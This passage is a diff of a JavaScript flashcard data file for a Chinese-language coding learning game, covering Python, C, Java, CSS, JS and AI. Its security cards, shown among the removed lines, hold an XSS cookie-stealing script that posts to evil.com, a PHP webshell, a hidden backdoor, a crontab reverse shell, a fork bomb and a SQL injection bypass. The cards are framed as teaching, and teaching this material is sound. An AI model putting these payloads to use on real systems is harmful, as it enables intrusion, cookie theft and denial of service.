@@ -1,2355 +1,2355 @@
-/* Programming Learning Game - Main App */
+/* Autumn Study - Main App */
 
 // ============== 游戏数据 ==============
-        const GAME_DATA = {
-            // 知识卡片数据
-            knowledgeCards: [
+const GAME_DATA = {
+    // 知识卡片数据
+    knowledgeCards: [
+        {
+            category: "Python基础",
+            icon: "🐍",
+            cards: [
                 {
-                    category: "Python基础",
-                    icon: "🐍",
-                    cards: [
-                        {
-                            front: "什么是变量？",
-                            back: "变量是存储数据的容器，就像一个贴了标签的盒子。\n\n例如：name = '小明' 表示创建一个叫name的盒子，里面放着'小明'",
-                            code: "name = '小明'\nage = 18\nprint(f'{name}今年{age}岁')"
-                        },
-                        {
-                            front: "列表 vs 字典",
-                            back: "列表(list)：有序的数据集合，用索引访问\n字典(dict)：键值对集合，用键名访问\n\n就像：列表是排队的人，字典是通讯录",
-                            code: "# 列表：按顺序存储\nfruits = ['苹果', '香蕉', '橙子']\nprint(fruits[0])  # 苹果\n\n# 字典：按名字存储\nperson = {'name': '小明', 'age': 18}\nprint(person['name'])  # 小明"
-                        },
-                        {
-                            front: "for循环是什么？",
-                            back: "for循环用来重复执行代码，遍历一个序列中的每个元素。\n\n就像：逐个检查排队的每个人",
-                            code: "# 遍历列表\nfor fruit in ['苹果', '香蕉']:\n    print(f'我喜欢{fruit}')\n\n# 遍历数字\nfor i in range(3):\n    print(f'第{i+1}次')"
-                        }
-                    ]
+                    front: "什么是变量？",
+                    back: "变量是存储数据的容器，就像一个贴了标签的盒子。\n\n例如：name = '小明' 表示创建一个叫name的盒子，里面放着'小明'",
+                    code: "name = '小明'\nage = 18\nprint(f'{name}今年{age}岁')"
                 },
                 {
-                    category: "Tkinter GUI",
-                    icon: "🖼️",
-                    cards: [
-                        {
-                            front: "如何创建一个窗口？",
-                            back: "使用Tk()创建主窗口，mainloop()让窗口保持显示。\n\n就像：打开电视(Tk)然后保持开着(mainloop)",
-                            code: "import tkinter as tk\n\n# 创建窗口\nroot = tk.Tk()\nroot.title('我的第一个窗口')\nroot.geometry('400x300')\n\n# 保持窗口显示\nroot.mainloop()"
-                        },
-                        {
-                            front: "什么是Label和Button？",
-                            back: "Label：显示文字或图片的标签\nButton：可点击的按钮\n\n就像：Label是告示牌，Button是门铃",
-                            code: "import tkinter as tk\n\nroot = tk.Tk()\n\n# 创建标签\nlabel = tk.Label(root, text='你好！')\nlabel.pack()\n\n# 创建按钮\ndef say_hi():\n    print('被点击了！')\n\nbtn = tk.Button(root, text='点我', command=say_hi)\nbtn.pack()\n\nroot.mainloop()"
-                        },
-                        {
-                            front: "pack() vs grid() 布局",
-                            back: "pack()：按顺序排列组件（上下或左右）\ngrid()：按表格方式排列（行和列）\n\n就像：pack是排队，grid是坐座位",
-                            code: "# pack布局：垂直排列\nlabel1.pack(side='top')\nlabel2.pack(side='top')\n\n# grid布局：表格排列\nlabel1.grid(row=0, column=0)\nlabel2.grid(row=0, column=1)\nlabel3.grid(row=1, column=0)"
-                        }
-                    ]
+                    front: "列表 vs 字典",
+                    back: "列表(list)：有序的数据集合，用索引访问\n字典(dict)：键值对集合，用键名访问\n\n就像：列表是排队的人，字典是通讯录",
+                    code: "# 列表：按顺序存储\nfruits = ['苹果', '香蕉', '橙子']\nprint(fruits[0])  # 苹果\n\n# 字典：按名字存储\nperson = {'name': '小明', 'age': 18}\nprint(person['name'])  # 小明"
                 },
                 {
-                    category: "Pandas数据处理",
-                    icon: "📊",
-                    cards: [
-                        {
-                            front: "什么是DataFrame？",
-                            back: "DataFrame是Pandas的核心数据结构，就像Excel表格一样，有行和列。\n\n可以用来存储和处理表格数据",
-                            code: "import pandas as pd\n\n# 创建DataFrame\ndata = {\n    '姓名': ['小明', '小红'],\n    '年龄': [18, 17]\n}\ndf = pd.DataFrame(data)\nprint(df)"
-                        },
-                        {
-                            front: "如何读取Excel文件？",
-                            back: "使用read_excel()读取，to_excel()保存。\n\n就像打开和保存Word文档一样简单",
-                            code: "import pandas as pd\n\n# 读取Excel\ndf = pd.read_excel('数据.xlsx')\n\n# 查看数据\nprint(df.head())  # 前5行\n\n# 保存Excel\ndf.to_excel('新数据.xlsx', index=False)"
-                        },
-                        {
-                            front: "如何筛选数据？",
-                            back: "使用条件表达式筛选符合条件的行。\n\n就像：从学生中找出年龄大于18的",
-                            code: "import pandas as pd\n\n# 筛选年龄>18的行\nadults = df[df['年龄'] > 18]\n\n# 筛选特定城市\nbeijing = df[df['城市'] == '北京']\n\n# 多条件筛选\nresult = df[(df['年龄'] > 18) & (df['城市'] == '北京')]"
-                        }
-                    ]
-                },
-                {
-                    category: "网络爬虫",
-                    icon: "🕷️",
-                    cards: [
-                        {
-                            front: "requests是什么？",
-                            back: "requests是Python的HTTP库，用来发送网络请求获取网页内容。\n\n就像：派一个人去网站把内容带回来",
-                            code: "import requests\n\n# 发送GET请求\nresponse = requests.get('https://example.com')\n\n# 获取网页内容\nhtml = response.text\nprint(html[:100])  # 打印前100字符"
-                        },
-                        {
-                            front: "BeautifulSoup怎么用？",
-                            back: "BeautifulSoup用来解析HTML，提取需要的数据。\n\n就像：把一本书拆开，找到你要的章节",
-                            code: "from bs4 import BeautifulSoup\n\nhtml = '<h1>标题</h1><p>内容</p>'\nsoup = BeautifulSoup(html, 'html.parser')\n\n# 查找元素\ntitle = soup.find('h1').text\nprint(title)  # 标题\n\n# 查找所有\nall_p = soup.find_all('p')"
-                        },
-                        {
-                            front: "什么是反爬虫？",
-                            back: "网站会检测并阻止爬虫。常见应对方法：\n1. 设置User-Agent伪装浏览器\n2. 添加延迟避免过快\n3. 使用代理IP",
-                            code: "import requests\nimport time\n\n# 伪装浏览器\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'\n}\n\n# 发送请求\nresponse = requests.get(url, headers=headers)\n\n# 添加延迟\ntime.sleep(0.5)"
-                        }
-                    ]
-                },
-                // ========== 网络安全分类 ==========
-                {
-                    category: "渗透测试基础",
-                    icon: "🔍",
-                    courseType: "security",
-                    cards: [
-                        {
-                            front: "什么是渗透测试？",
-                            back: "渗透测试是经过授权的安全测试，模拟黑客攻击来发现系统漏洞。\n\n就像：请专业人员测试你家的锁是否安全",
-                            code: "# 渗透测试基本流程\n1. 信息收集 → 了解目标\n2. 漏洞扫描 → 发现弱点\n3. 漏洞利用 → 验证风险\n4. 报告编写 → 提出建议"
-                        },
-                        {
-                            front: "什么是HTTP请求？",
-                            back: "HTTP是浏览器和服务器通信的协议。\n\n就像：你点餐(请求)，餐厅上菜(响应)",
-                            code: "# GET请求 - 获取数据\nGET /index.html HTTP/1.1\nHost: example.com\n\n# POST请求 - 提交数据\nPOST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=123"
-                        },
-                        {
-                            front: "什么是漏洞？",
-                            back: "漏洞是系统中的安全缺陷，可能被攻击者利用。\n\n常见漏洞类型：\n• 文件上传漏洞\n• SQL注入\n• XSS跨站脚本\n• 命令注入",
-                            code: "# 漏洞危害等级\n严重(Critical) - 可完全控制系统\n高危(High) - 可获取敏感数据\n中危(Medium) - 可影响部分功能\n低危(Low) - 影响较小"
-                        }
-                    ]
-                },
-                {
-                    category: "常见漏洞类型",
-                    icon: "⚠️",
-                    courseType: "security",
-                    cards: [
-                        {
-                            front: "什么是竞态条件漏洞？",
-                            back: "竞态条件是时间窗口漏洞，在系统处理过程中的短暂间隙进行攻击。\n\n就像：在保安到达前，你先进了门",
-                            code: "# 竞态条件利用原理\n1. 上传文件\n2. 服务器检查文件(需要时间)\n3. 在检查完成前快速访问\n4. 文件被执行！\n\n# 防御方法\n使用文件锁或原子操作"
-                        },
-                        {
-                            front: "什么是SQL注入？",
-                            back: "SQL注入是通过用户输入注入恶意SQL代码，操纵数据库。\n\n就像：在表格里填写特殊内容，让系统执行你的命令",
-                            code: "# 正常登录\nSELECT * FROM users \nWHERE username='admin' AND password='123'\n\n# SQL注入攻击\n输入: admin' OR '1'='1\nSELECT * FROM users \nWHERE username='admin' OR '1'='1'--'\n# 永远为真，绕过登录！"
-                        },
-                        {
-                            front: "什么是XSS跨站脚本？",
-                            back: "XSS是在网页中注入恶意脚本，当其他用户访问时执行。\n\n分类：\n• 存储型XSS - 存入数据库\n• 反射型XSS - URL参数\n• DOM型XSS - 前端代码",
-                            code: "# XSS攻击示例\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n# 窃取Cookie\n&lt;script&gt;\nnew Image().src='http://evil.com/steal?c='+document.cookie\n&lt;/script&gt;\n\n# 防御：转义HTML特殊字符"
-                        },
-                        {
-                            front: "什么是文件上传漏洞？",
-                            back: "允许上传恶意文件（如WebShell），获得服务器控制权。\n\n危害：远程代码执行(RCE)",
-                            code: "# WebShell示例\n<?php system($_GET['c']); ?>\n\n# 访问执行命令\nhttp://target.com/shell.php?c=whoami\n\n# 防御方法\n1. 白名单验证文件类型\n2. 随机重命名文件\n3. 禁止上传目录执行"
-                        }
-                    ]
-                },
-                {
-                    category: "WebShell与后门",
-                    icon: "🐚",
-                    courseType: "security",
-                    cards: [
-                        {
-                            front: "什么是WebShell？",
-                            back: "WebShell是网页形式的命令行，让你通过浏览器执行服务器命令。\n\n就像：在网页上开了一个远程终端",
-                            code: "# 最简单的PHP WebShell\n<?php system($_GET['c']); ?>\n\n# 使用方法\nhttp://target.com/shell.php?c=ls\nhttp://target.com/shell.php?c=cat /etc/passwd"
-                        },
-                        {
-                            front: "WebShell常用命令",
-                            back: "通过WebShell可以执行各种系统命令：\n\n• whoami - 当前用户\n• pwd - 当前目录\n• ls -la - 列出文件\n• cat file - 读取文件",
-                            code: "# 常用命令\n?c=whoami          # 查看用户\n?c=pwd             # 当前目录\n?c=ls -la          # 列出文件\n?c=cat /etc/passwd # 读取文件\n?c=uname -a        # 系统信息\n?c=ps aux          # 进程列表"
-                        },
-                        {
-                            front: "什么是持久化后门？",
-                            back: "持久化后门是保持长期访问权限的方法，即使漏洞被修复也能继续访问。\n\n就像：配了一把备用钥匙",
-                            code: "# 创建持久化WebShell\n<?php\n// 隐藏的后门代码\nif(isset($_GET['backdoor'])){\n    system($_GET['backdoor']);\n}\n?>\n\n# 定时任务后门\ncrontab -e\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
-                        }
-                    ]
-                },
-                {
-                    category: "DoS攻击原理",
-                    icon: "💥",
-                    courseType: "security",
-                    cards: [
-                        {
-                            front: "什么是DoS攻击？",
-                            back: "DoS(拒绝服务)攻击通过耗尽系统资源，使正常服务不可用。\n\nDDoS是分布式DoS，使用多台机器同时攻击。",
-                            code: "# DoS攻击类型\n1. 带宽耗尽 - 发送大量流量\n2. 资源耗尽 - 占用CPU/内存\n3. 应用层攻击 - 大量HTTP请求\n\n# 影响\n- 服务器响应缓慢\n- 正常用户无法访问\n- 业务中断"
-                        },
-                        {
-                            front: "资源耗尽攻击",
-                            back: "通过消耗服务器的CPU、内存、进程等资源使其瘫痪。\n\n类型：\n• CPU炸弹 - 无限循环\n• 内存炸弹 - 填满内存\n• Fork炸弹 - 创建大量进程",
-                            code: "# Fork炸弹示例(危险!)\n:(){ :|:& };:\n\n# Python资源消耗\nimport threading\ndef bomb():\n    while True:\n        threading.Thread(target=bomb).start()\n\n⚠️ 仅用于学习，禁止非法使用！"
-                        },
-                        {
-                            front: "如何防御DoS攻击？",
-                            back: "防御DoS需要多层防护：\n\n1. 流量清洗\n2. CDN分发\n3. 限流限速\n4. 资源隔离",
-                            code: "# 服务器防护配置\n# 限制连接数\niptables -A INPUT -p tcp --syn -m limit \\\n  --limit 1/s --limit-burst 3 -j ACCEPT\n\n# 限制进程资源\nulimit -u 100   # 最大进程数\nulimit -m 1024000  # 最大内存"
-                        }
-                    ]
-                },
-                {
-                    category: "安全防御",
-                    icon: "🛡️",
-                    courseType: "security",
-                    cards: [
-                        {
-                            front: "如何防止文件上传漏洞？",
-                            back: "文件上传安全的核心是：不信任任何用户输入\n\n关键措施：\n• 白名单验证\n• 随机文件名\n• 独立存储目录\n• 禁止执行权限",
-                            code: "# 安全的文件上传\nallowed_types = ['.jpg', '.png', '.pdf']\n\n# 1. 验证扩展名\nif ext not in allowed_types:\n    return '不允许的文件类型'\n\n# 2. 随机文件名\nimport uuid\nfilename = str(uuid.uuid4()) + ext\n\n# 3. 禁止执行\nos.chmod(filepath, 0o644)"
-                        },
-                        {
-                            front: "如何防止SQL注入？",
-                            back: "SQL注入防御的核心：参数化查询\n\n永远不要拼接SQL语句！",
-                            code: "# ❌ 错误做法 - 拼接SQL\nsql = f\"SELECT * FROM users WHERE id={user_id}\"\n\n# ✅ 正确做法 - 参数化查询\ncursor.execute(\n    \"SELECT * FROM users WHERE id = %s\",\n    (user_id,)\n)\n\n# 使用ORM框架\nUser.query.filter_by(id=user_id).first()"
-                        },
-                        {
-                            front: "安全开发最佳实践",
-                            back: "安全开发OWASP原则：\n\n1. 输入验证\n2. 输出编码\n3. 最小权限\n4. 纵深防御\n5. 安全默认",
-                            code: "# 安全开发清单\n✓ 所有输入都要验证\n✓ 所有输出都要编码\n✓ 使用HTTPS加密传输\n✓ 密码加盐哈希存储\n✓ 实施访问控制\n✓ 记录安全日志\n✓ 定期安全测试"
-                        }
-                    ]
-                },
-                // ========== C语言 ==========
-                {
-                    category: "C语言基础",
-                    icon: "⚙️",
-                    courseType: "c",
-                    cards: [
-                        { front: "什么是C语言？", back: "C语言是一种通用的、过程式的编程语言\n\n特点：\n• 接近硬件，运行效率高\n• 可移植性强\n• 是很多语言的基础", code: "#include <stdio.h>\n\nint main() {\n    printf(\"Hello, C!\\n\");\n    return 0;\n}" },
-                        { front: "C语言的数据类型", back: "C语言基本数据类型：\n\n• int - 整数\n• float - 单精度浮点\n• double - 双精度浮点\n• char - 字符", code: "int age = 18;\nfloat price = 9.99;\ndouble pi = 3.14159265;\nchar grade = 'A';" },
-                        { front: "printf格式化输出", back: "printf用于格式化输出\n\n常用格式符：\n• %d - 整数\n• %f - 浮点数\n• %c - 字符\n• %s - 字符串", code: "int num = 10;\nfloat f = 3.14;\nprintf(\"整数: %d\\n\", num);\nprintf(\"浮点: %.2f\\n\", f);\nprintf(\"字符: %c\\n\", 'A');" },
-                        { front: "scanf输入函数", back: "scanf用于读取用户输入\n\n注意：变量前要加 & 取地址", code: "int age;\nprintf(\"请输入年龄: \");\nscanf(\"%d\", &age);\nprintf(\"你的年龄是: %d\\n\", age);" }
-                    ]
-                },
-                {
-                    category: "指针与内存",
-                    icon: "📍",
-                    courseType: "c",
-                    cards: [
-                        { front: "什么是指针？", back: "指针是存储内存地址的变量\n\n• & - 取地址运算符\n• * - 解引用运算符", code: "int num = 10;\nint *ptr = &num;  // ptr存储num的地址\n\nprintf(\"num的值: %d\\n\", num);\nprintf(\"num的地址: %p\\n\", &num);\nprintf(\"ptr指向的值: %d\\n\", *ptr);" },
-                        { front: "指针与数组", back: "数组名就是指向首元素的指针\n\n数组和指针可以互换使用", code: "int arr[] = {1, 2, 3, 4, 5};\nint *p = arr;  // p指向arr[0]\n\nprintf(\"%d\\n\", arr[0]);  // 1\nprintf(\"%d\\n\", *p);      // 1\nprintf(\"%d\\n\", *(p+1));  // 2" },
-                        { front: "动态内存分配", back: "使用malloc/free管理动态内存\n\n• malloc - 分配内存\n• free - 释放内存", code: "#include <stdlib.h>\n\nint *arr = (int*)malloc(5 * sizeof(int));\nif (arr == NULL) {\n    printf(\"内存分配失败\\n\");\n    return 1;\n}\n// 使用内存...\nfree(arr);  // 释放内存" }
-                    ]
-                },
-                {
-                    category: "结构体与文件",
-                    icon: "📦",
-                    courseType: "c",
-                    cards: [
-                        { front: "什么是结构体？", back: "结构体是自定义的数据类型\n可以包含不同类型的成员", code: "struct Student {\n    char name[50];\n    int age;\n    float score;\n};\n\nstruct Student s1;\nstrcpy(s1.name, \"张三\");\ns1.age = 18;\ns1.score = 95.5;" },
-                        { front: "文件操作", back: "C语言文件操作：\n• fopen - 打开文件\n• fclose - 关闭文件\n• fprintf/fscanf - 读写", code: "FILE *fp = fopen(\"test.txt\", \"w\");\nif (fp != NULL) {\n    fprintf(fp, \"Hello File!\\n\");\n    fclose(fp);\n}" }
-                    ]
-                },
-                // ========== C++ ==========
-                {
-                    category: "C++基础",
-                    icon: "🔧",
-                    courseType: "cpp",
-                    cards: [
-                        { front: "C++与C的区别", back: "C++是C的超集，增加了：\n\n• 面向对象\n• 类和对象\n• 引用\n• 命名空间\n• STL标准库", code: "#include <iostream>\nusing namespace std;\n\nint main() {\n    cout << \"Hello C++!\" << endl;\n    return 0;\n}" },
-                        { front: "C++的输入输出", back: "C++使用流对象：\n• cout - 输出\n• cin - 输入\n• endl - 换行", code: "#include <iostream>\nusing namespace std;\n\nint age;\ncout << \"请输入年龄: \";\ncin >> age;\ncout << \"你的年龄是: \" << age << endl;" },
-                        { front: "引用与指针", back: "引用是变量的别名\n\n• 引用必须初始化\n• 引用不能改变指向\n• 引用更安全易用", code: "int num = 10;\nint &ref = num;  // ref是num的别名\n\nref = 20;\ncout << num << endl;  // 20\ncout << ref << endl;  // 20" }
-                    ]
-                },
-                {
-                    category: "类与对象",
-                    icon: "🎯",
-                    courseType: "cpp",
-                    cards: [
-                        { front: "如何定义类？", back: "类是面向对象的核心\n\n包含：\n• 成员变量（属性）\n• 成员函数（方法）\n• 访问修饰符", code: "class Student {\nprivate:\n    string name;\n    int age;\npublic:\n    void setName(string n) { name = n; }\n    string getName() { return name; }\n};" },
-                        { front: "构造函数与析构函数", back: "构造函数：创建对象时调用\n析构函数：销毁对象时调用", code: "class Person {\npublic:\n    Person() { cout << \"创建对象\" << endl; }\n    ~Person() { cout << \"销毁对象\" << endl; }\n};\n\nPerson p;  // 调用构造函数\n// 作用域结束时调用析构函数" },
-                        { front: "继承", back: "继承允许子类拥有父类的属性和方法\n\n• public继承最常用\n• 子类可以重写父类方法", code: "class Animal {\npublic:\n    void eat() { cout << \"吃东西\" << endl; }\n};\n\nclass Dog : public Animal {\npublic:\n    void bark() { cout << \"汪汪\" << endl; }\n};" }
-                    ]
-                },
-                {
-                    category: "STL标准库",
-                    icon: "📚",
-                    courseType: "cpp",
-                    cards: [
-                        { front: "什么是STL？", back: "STL = Standard Template Library\n\n包含：\n• 容器(vector, map等)\n• 算法(sort, find等)\n• 迭代器", code: "#include <vector>\n#include <algorithm>\n\nvector<int> nums = {3, 1, 4, 1, 5};\nsort(nums.begin(), nums.end());\n// nums: 1, 1, 3, 4, 5" },
-                        { front: "vector动态数组", back: "vector是最常用的容器\n\n• 自动扩容\n• 支持随机访问\n• push_back添加元素", code: "vector<int> v;\nv.push_back(10);\nv.push_back(20);\n\nfor (int i = 0; i < v.size(); i++) {\n    cout << v[i] << endl;\n}" },
-                        { front: "map映射", back: "map是键值对容器\n\n• 自动按键排序\n• 键唯一\n• O(log n)查找", code: "map<string, int> ages;\nages[\"张三\"] = 18;\nages[\"李四\"] = 20;\n\ncout << ages[\"张三\"] << endl;  // 18" }
-                    ]
-                },
-                // ========== Java ==========
-                {
-                    category: "Java基础",
-                    icon: "☕",
-                    courseType: "java",
-                    cards: [
-                        { front: "Java的特点", back: "Java特点：\n\n• 跨平台(Write Once, Run Anywhere)\n• 面向对象\n• 自动内存管理\n• 强类型语言", code: "public class Hello {\n    public static void main(String[] args) {\n        System.out.println(\"Hello Java!\");\n    }\n}" },
-                        { front: "Java数据类型", back: "基本类型：\n• byte, short, int, long\n• float, double\n• char, boolean\n\n引用类型：类、数组、接口", code: "int age = 18;\ndouble price = 19.99;\nboolean isStudent = true;\nchar grade = 'A';\nString name = \"张三\";  // 引用类型" },
-                        { front: "数组", back: "Java数组是固定长度的\n\n声明方式：\n• 类型[] 名称\n• new 类型[长度]", code: "// 方式1\nint[] arr1 = {1, 2, 3, 4, 5};\n\n// 方式2\nint[] arr2 = new int[5];\narr2[0] = 1;\n\n// 遍历\nfor (int num : arr1) {\n    System.out.println(num);\n}" }
-                    ]
-                },
-                {
-                    category: "Java面向对象",
-                    icon: "🎯",
-                    courseType: "java",
-                    cards: [
-                        { front: "类的定义", back: "Java类包含：\n• 成员变量\n• 构造方法\n• 成员方法\n• 访问修饰符", code: "public class Student {\n    private String name;\n    private int age;\n    \n    public Student(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    \n    public String getName() {\n        return name;\n    }\n}" },
-                        { front: "继承与多态", back: "继承：extends关键字\n多态：父类引用指向子类对象", code: "class Animal {\n    public void speak() {\n        System.out.println(\"动物叫\");\n    }\n}\n\nclass Dog extends Animal {\n    @Override\n    public void speak() {\n        System.out.println(\"汪汪\");\n    }\n}\n\nAnimal a = new Dog();\na.speak();  // 汪汪" },
-                        { front: "接口", back: "接口定义行为规范\n\n• interface关键字\n• implements实现\n• 方法默认public abstract", code: "interface Flyable {\n    void fly();\n}\n\nclass Bird implements Flyable {\n    public void fly() {\n        System.out.println(\"鸟在飞\");\n    }\n}" }
-                    ]
-                },
-                {
-                    category: "Java集合框架",
-                    icon: "📦",
-                    courseType: "java",
-                    cards: [
-                        { front: "ArrayList", back: "ArrayList是动态数组\n\n• 有序、可重复\n• 随机访问快\n• 增删慢", code: "ArrayList<String> list = new ArrayList<>();\nlist.add(\"苹果\");\nlist.add(\"香蕉\");\n\nfor (String fruit : list) {\n    System.out.println(fruit);\n}" },
-                        { front: "HashMap", back: "HashMap是键值对集合\n\n• 键唯一\n• 无序\n• 查找快O(1)", code: "HashMap<String, Integer> map = new HashMap<>();\nmap.put(\"张三\", 18);\nmap.put(\"李四\", 20);\n\nSystem.out.println(map.get(\"张三\"));  // 18" }
-                    ]
-                },
-                // ========== CSS ==========
-                {
-                    category: "CSS基础",
-                    icon: "🎨",
-                    courseType: "css",
-                    cards: [
-                        { front: "什么是CSS？", back: "CSS = Cascading Style Sheets\n层叠样式表\n\n用于控制网页的样式和布局", code: "/* 选择器 { 属性: 值; } */\nbody {\n    background-color: #f0f0f0;\n    font-family: Arial, sans-serif;\n}" },
-                        { front: "CSS选择器", back: "常用选择器：\n• 元素选择器: p\n• 类选择器: .class\n• ID选择器: #id\n• 后代选择器: div p", code: "/* 元素选择器 */\np { color: blue; }\n\n/* 类选择器 */\n.highlight { background: yellow; }\n\n/* ID选择器 */\n#header { font-size: 24px; }\n\n/* 后代选择器 */\nnav a { text-decoration: none; }" },
-                        { front: "盒模型", back: "CSS盒模型包含：\n• content - 内容\n• padding - 内边距\n• border - 边框\n• margin - 外边距", code: ".box {\n    width: 200px;\n    padding: 20px;\n    border: 1px solid #ccc;\n    margin: 10px;\n    \n    /* 总宽度 = 200+20*2+1*2+10*2 = 262px */\n    box-sizing: border-box;  /* 让width包含padding和border */\n}" }
-                    ]
-                },
-                {
-                    category: "CSS布局",
-                    icon: "📐",
-                    courseType: "css",
-                    cards: [
-                        { front: "Flexbox弹性布局", back: "Flexbox用于一维布局\n\n• display: flex\n• justify-content 主轴对齐\n• align-items 交叉轴对齐", code: ".container {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.item {\n    flex: 1;  /* 平均分配空间 */\n}" },
-                        { front: "Grid网格布局", back: "Grid用于二维布局\n\n• display: grid\n• grid-template-columns\n• grid-template-rows", code: ".grid {\n    display: grid;\n    grid-template-columns: repeat(3, 1fr);\n    grid-gap: 20px;\n}\n\n/* 3列等宽网格，间距20px */" },
-                        { front: "定位position", back: "position属性：\n• static 默认\n• relative 相对定位\n• absolute 绝对定位\n• fixed 固定定位", code: ".parent {\n    position: relative;\n}\n\n.child {\n    position: absolute;\n    top: 10px;\n    right: 10px;\n}" }
-                    ]
-                },
-                {
-                    category: "CSS动画",
-                    icon: "✨",
-                    courseType: "css",
-                    cards: [
-                        { front: "transition过渡", back: "transition用于平滑过渡\n\n属性：\n• transition-property\n• transition-duration\n• transition-timing-function", code: ".button {\n    background: blue;\n    transition: all 0.3s ease;\n}\n\n.button:hover {\n    background: red;\n    transform: scale(1.1);\n}" },
-                        { front: "animation动画", back: "animation用于复杂动画\n\n• @keyframes定义动画\n• animation属性应用", code: "@keyframes bounce {\n    0%, 100% { transform: translateY(0); }\n    50% { transform: translateY(-20px); }\n}\n\n.ball {\n    animation: bounce 1s infinite;\n}" }
-                    ]
-                },
-                // ========== JavaScript ==========
-                {
-                    category: "JS基础",
-                    icon: "✨",
-                    courseType: "javascript",
-                    cards: [
-                        { front: "JavaScript简介", back: "JavaScript是网页的编程语言\n\n用途：\n• 网页交互\n• 动态效果\n• 表单验证\n• 后端开发(Node.js)", code: "// 变量声明\nlet name = '张三';\nconst PI = 3.14;\nvar age = 18;  // 旧写法\n\nconsole.log('Hello JavaScript!');" },
-                        { front: "数据类型", back: "JS数据类型：\n\n基本类型：\n• string, number, boolean\n• null, undefined, symbol\n\n引用类型：object", code: "let str = \"Hello\";\nlet num = 123;\nlet bool = true;\nlet arr = [1, 2, 3];\nlet obj = { name: '张三', age: 18 };\n\nconsole.log(typeof str);  // string" },
-                        { front: "函数", back: "JS函数定义方式：\n• function关键字\n• 箭头函数\n• 函数表达式", code: "// 普通函数\nfunction add(a, b) {\n    return a + b;\n}\n\n// 箭头函数\nconst multiply = (a, b) => a * b;\n\n// 函数表达式\nconst greet = function(name) {\n    console.log('Hello ' + name);\n};" }
-                    ]
-                },
-                {
-                    category: "DOM操作",
-                    icon: "🌐",
-                    courseType: "javascript",
-                    cards: [
-                        { front: "什么是DOM？", back: "DOM = Document Object Model\n文档对象模型\n\nJS通过DOM操作网页元素", code: "// 获取元素\nlet el = document.getElementById('myId');\nlet els = document.querySelectorAll('.myClass');\n\n// 修改内容\nel.innerHTML = '新内容';\nel.textContent = '纯文本';" },
-                        { front: "事件处理", back: "事件是用户或浏览器的动作\n\n常见事件：\n• click 点击\n• submit 提交\n• keydown 按键\n• load 加载完成", code: "// 方式1：addEventListener\nbtn.addEventListener('click', function() {\n    alert('点击了按钮');\n});\n\n// 方式2：箭头函数\nbtn.addEventListener('click', () => {\n    console.log('clicked');\n});" },
-                        { front: "修改样式", back: "JS可以动态修改CSS样式\n\n• style属性\n• classList操作类名", code: "// 直接修改style\nel.style.color = 'red';\nel.style.backgroundColor = 'blue';\n\n// 操作class\nel.classList.add('active');\nel.classList.remove('hidden');\nel.classList.toggle('selected');" }
-                    ]
-                },
-                {
-                    category: "ES6+新特性",
-                    icon: "🚀",
-                    courseType: "javascript",
-                    cards: [
-                        { front: "let和const", back: "ES6新增变量声明：\n\n• let - 块级作用域变量\n• const - 常量，不可重新赋值\n• 不要再用var", code: "// let 块级作用域\nif (true) {\n    let x = 10;\n}\nconsole.log(x);  // 报错\n\n// const 常量\nconst PI = 3.14;\nPI = 3;  // 报错" },
-                        { front: "模板字符串", back: "使用反引号 ` 定义字符串\n\n• 支持多行\n• 支持变量插值 ${}", code: "const name = '张三';\nconst age = 18;\n\n// 模板字符串\nconst msg = `我是${name}，今年${age}岁`;\n\n// 多行字符串\nconst html = `\n    <div>\n        <h1>${name}</h1>\n    </div>\n`;" },
-                        { front: "解构赋值", back: "快速从数组或对象中提取值\n\n• 数组解构\n• 对象解构", code: "// 数组解构\nconst [a, b] = [1, 2];\n\n// 对象解构\nconst { name, age } = { name: '张三', age: 18 };\n\n// 函数参数解构\nfunction greet({ name }) {\n    console.log(`Hello ${name}`);\n}" },
-                        { front: "Promise异步", back: "Promise用于处理异步操作\n\n• 三种状态：pending/fulfilled/rejected\n• then/catch处理结果", code: "// 创建Promise\nconst p = new Promise((resolve, reject) => {\n    setTimeout(() => resolve('成功'), 1000);\n});\n\n// 使用\np.then(result => console.log(result))\n .catch(error => console.log(error));\n\n// async/await\nasync function getData() {\n    const result = await p;\n    console.log(result);\n}" }
-                    ]
-                },
-                // ========== AI人工智能 ==========
-                {
-                    category: "AI基础概念",
-                    icon: "🤖",
-                    courseType: "ai",
-                    cards: [
-                        { front: "什么是人工智能？", back: "人工智能(AI)是让机器模拟人类智能的技术\n\n主要分支：\n• 机器学习\n• 深度学习\n• 自然语言处理\n• 计算机视觉", code: "# AI的三个层次\n1. 弱AI - 专注特定任务\n   如：语音助手、推荐系统\n\n2. 强AI - 通用人类智能\n   目前尚未实现\n\n3. 超级AI - 超越人类\n   理论概念" },
-                        { front: "机器学习 vs 深度学习", back: "机器学习：从数据中学习规律\n深度学习：使用神经网络的机器学习\n\n深度学习是机器学习的子集", code: "# 机器学习流程\n数据收集 → 数据清洗 → 特征工程\n    ↓\n模型训练 → 模型评估 → 部署应用\n\n# 深度学习特点\n• 自动提取特征\n• 需要大量数据\n• 需要GPU算力" },
-                        { front: "监督学习 vs 无监督学习", back: "监督学习：有标签数据\n• 分类：预测类别\n• 回归：预测数值\n\n无监督学习：无标签数据\n• 聚类：发现群组\n• 降维：简化数据", code: "# 监督学习例子\n图片 → [猫/狗] 分类\n房屋特征 → 价格预测\n\n# 无监督学习例子\n客户数据 → 用户分群\n高维数据 → PCA降维" }
-                    ]
-                },
-                {
-                    category: "神经网络",
-                    icon: "🧠",
-                    courseType: "ai",
-                    cards: [
-                        { front: "什么是神经网络？", back: "神经网络模拟人脑神经元结构\n\n基本组成：\n• 输入层\n• 隐藏层\n• 输出层\n• 权重和偏置", code: "# 简单神经网络结构\n输入层(特征) → 隐藏层 → 输出层(预测)\n    x1 ─┐\n    x2 ─┼─→ [神经元] ─→ y\n    x3 ─┘\n\n# 每个连接都有权重w\ny = f(w1*x1 + w2*x2 + w3*x3 + b)" },
